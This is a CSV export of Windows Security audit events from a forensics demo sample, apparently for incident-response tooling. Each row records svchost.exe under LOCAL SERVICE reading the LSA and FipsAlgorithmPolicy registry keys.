RecordNumber,EventRecordId,TimeCreated,EventId,Level,Provider,Channel,ProcessId,ThreadId,Computer,ChunkNumber,UserId,MapDescription,UserName,RemoteHost,PayloadData1,PayloadData2,PayloadData3,PayloadData4,PayloadData5,PayloadData6,ExecutableInfo,HiddenRecord,SourceFile,Keywords,ExtraDataOffset,Payload
21,452831,2019-03-19 23:35:15.2953765,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa\FipsAlgorithmPolicy,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa\\FipsAlgorithmPolicy""},{""@Name"":""HandleId"",""#text"":""0x520""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
22,452832,2019-03-19 23:35:15.2953765,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa""},{""@Name"":""HandleId"",""#text"":""0x468""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
23,452833,2019-03-19 23:35:15.2953765,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa\FipsAlgorithmPolicy,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa\\FipsAlgorithmPolicy""},{""@Name"":""HandleId"",""#text"":""0x468""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
24,452834,2019-03-19 23:35:15.2953765,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa""},{""@Name"":""HandleId"",""#text"":""0x520""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
25,452835,2019-03-19 23:35:15.2953765,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa\FipsAlgorithmPolicy,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa\\FipsAlgorithmPolicy""},{""@Name"":""HandleId"",""#text"":""0x520""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
26,452836,2019-03-19 23:35:15.2953765,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa""},{""@Name"":""HandleId"",""#text"":""0x468""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
27,452837,2019-03-19 23:35:15.2953765,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa\FipsAlgorithmPolicy,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa\\FipsAlgorithmPolicy""},{""@Name"":""HandleId"",""#text"":""0x468""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
28,452838,2019-03-19 23:35:15.2953765,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa""},{""@Name"":""HandleId"",""#text"":""0x520""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
29,452839,2019-03-19 23:35:15.2953765,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa\FipsAlgorithmPolicy,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa\\FipsAlgorithmPolicy""},{""@Name"":""HandleId"",""#text"":""0x520""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
30,452840,2019-03-19 23:35:15.2953765,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa""},{""@Name"":""HandleId"",""#text"":""0x468""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
31,452841,2019-03-19 23:35:15.2953765,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa\FipsAlgorithmPolicy,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa\\FipsAlgorithmPolicy""},{""@Name"":""HandleId"",""#text"":""0x468""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
32,452842,2019-03-19 23:35:15.2953765,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa""},{""@Name"":""HandleId"",""#text"":""0x520""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
33,452843,2019-03-19 23:35:15.2953765,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa\FipsAlgorithmPolicy,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa\\FipsAlgorithmPolicy""},{""@Name"":""HandleId"",""#text"":""0x520""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
34,452844,2019-03-19 23:35:15.2953765,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa""},{""@Name"":""HandleId"",""#text"":""0x468""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
35,452845,2019-03-19 23:35:15.2953765,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa\FipsAlgorithmPolicy,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa\\FipsAlgorithmPolicy""},{""@Name"":""HandleId"",""#text"":""0x1AC""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
36,452846,2019-03-19 23:35:15.2953765,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa""},{""@Name"":""HandleId"",""#text"":""0x468""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
37,452847,2019-03-19 23:35:15.2953765,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa\FipsAlgorithmPolicy,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa\\FipsAlgorithmPolicy""},{""@Name"":""HandleId"",""#text"":""0x1AC""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
38,452848,2019-03-19 23:35:15.2953765,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa""},{""@Name"":""HandleId"",""#text"":""0x420""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
